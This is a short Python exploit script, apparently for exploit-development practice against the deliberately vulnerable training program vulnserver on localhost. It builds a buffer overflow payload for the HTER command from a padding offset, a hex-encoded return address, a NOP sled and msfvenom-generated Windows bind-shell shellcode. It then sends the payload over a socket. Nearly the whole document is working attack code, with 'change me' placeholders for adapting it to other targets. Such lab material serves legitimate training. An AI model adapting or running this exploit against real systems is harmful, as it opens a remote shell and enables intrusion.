import struct
import socket

VULNSRVR_CMD = b"HTER "  # change me
CRASH_LEN = 2451  # change me
OFFSET = 2041  # change me
SLED_LENGTH = 20 

target = ("127.0.0.1", 9999)  # vulnserver

# msfvenom -p windows/shell_bind_tcp LPORT=12345 -f hex -b '\x00' EXITFUNC=thread
# Payload size: 355 bytes
shellcode =  b"bac1891b70d9c8d97424f45829c9b15383e8fc31500e039187f985ed707f650d81e0efe8b0208b79e290df2f0f5a8ddb842e1aec2d847cc3aeb5bd422dc491a40c07e4a5497a05f702f0b8e7274c018c74400171cc632024463ae2c78b36abdfc87365543a0f74bc72f0db81ba0325c67dfc503e7e816285fc5de61da61650f956fa078a55b74cd47946806f85c327bf0f97031b4b432d3a3122525c9a9bf61737cf8a7a503ca784a02ab0f792f56a9f9e7eb558e05401f61f5772dfdb032277cd2ba987f2f9448f55527b7225023bdcce48b403ee721e2c878ea162610647e8814edf8463b5e8339b9f40d3d4c957dce4dfff4a6f0cc46b70196cfce7d7fd4f99e8d7273a7abcb735676be0125962648fc0dc9a5294271e8965a99f5cd18d8f98da89fb748d47553367260fedd4e0c7681733917472c57dc42b9082e9bb14fb175cdad6937c39f2e914e4975379174297849466687384036d3f02f81f50e7fe8c5122"

payload = VULNSRVR_CMD
payload += b"A" * OFFSET
# payload += struct.pack("<I", 0x62501205)  # change me
payload += b"05125062"
payload += b"90" * SLED_LENGTH
payload += shellcode
payload += b"C" * (CRASH_LEN - len(payload))

with socket.create_connection(target) as sock:
    sock.recv(512)  # Welcome to Vulnerable Server! ... 

    sent = sock.send(payload)
    print(f"sent {sent} bytes")
